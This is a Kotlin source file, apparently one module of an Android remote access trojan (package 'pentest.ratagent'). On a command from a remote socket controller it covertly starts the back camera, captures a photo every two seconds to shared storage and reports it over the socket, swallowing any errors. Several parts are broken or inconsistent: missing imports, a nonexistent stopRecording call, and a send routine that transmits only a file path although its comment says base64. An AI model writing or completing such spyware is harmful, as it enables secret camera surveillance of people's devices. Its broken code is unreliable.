package com.pentest.ratagent

import android.content.Context
import android.graphics.Bitmap
import android.graphics.ImageFormat
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

object CameraStream {
    private var camera: Camera? = null
    private lateinit var cameraExecutor: ExecutorService
    
    fun toggle() {
        if (camera == null) {
            startCamera()
        } else {
            stopCamera()
        }
    }
    
    private fun startCamera() {
        val context = SocketManager.socket?.callContext() ?: return
        cameraExecutor = Executors.newSingleThreadExecutor()
        
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        
        cameraProviderFuture.addListener({
            val cameraProvider: ProcessCameraProvider = cameraProviderFuture.get()
            
            val preview = Preview.Builder().build()
            val imageCapture = ImageCapture.Builder().build()
            
            val cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA
            
            try {
                cameraProvider.unbindAll()
                camera = cameraProvider.bindToLifecycle(
                    context as androidx.lifecycle.LifecycleOwner,
                    cameraSelector, preview, imageCapture
                )
                
                // Capture image every 2 seconds
                startPeriodicCapture(imageCapture)
                
            } catch (exc: Exception) { }
        }, ContextCompat.getMainExecutor(context))
    }
    
    private fun startPeriodicCapture(imageCapture: ImageCapture) {
        val clock = java.util.concurrent.Executors.newSingleThreadScheduledExecutor()
        clock.scheduleAtFixedRate({
            takePhoto(imageCapture)
        }, 0, 2, java.util.concurrent.TimeUnit.SECONDS)
    }
    
    private fun takePhoto(imageCapture: ImageCapture) {
        val outputFileOptions = ImageCapture.OutputFileOptions.Builder(File("/sdcard/temp.jpg")).build()
        imageCapture.takePicture(outputFileOptions, ContextCompat.getMainExecutor(SocketManager.socket?.callContext()), object : ImageCapture.OnImageSavedCallback {
            override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                // Send file via socket
                sendScreenshot(File("/sdcard/temp.jpg"))
            }
            override fun onError(exception: ImageCaptureException) { }
        })
    }
    
    private fun stopCamera() {
        camera?.cameraControl?.stopRecording()
        camera = null
    }
    
    private fun sendScreenshot(file: File) {
        // Convert to base64 and emit
        SocketManager.socket?.emit("screenshot", JSONObject().put("path", file.absolutePath))
    }
}